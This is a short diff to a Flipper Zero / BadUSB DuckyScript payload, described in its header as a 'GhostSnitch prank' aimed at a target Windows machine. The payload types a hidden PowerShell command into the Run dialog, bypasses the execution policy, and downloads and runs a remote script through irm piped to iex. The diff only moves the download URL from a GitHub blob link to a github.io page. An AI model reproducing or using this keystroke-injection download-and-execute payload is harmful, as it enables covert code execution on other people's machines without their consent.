@@ -4,5 +4,5 @@ REM Description: Initiates GhostSnitch prank script on target Windows machine
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://github.com/TBJr/Flipper-payloads/blob/5f95176db3609ec14638b0b7f6d6ffc6ffaf280e/host/GhostSnitch_Stego.ps1 | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://tbjr.github.io/Flipper-payloads/host/GhostSnitch_Stego.ps1 | iex
 ENTER
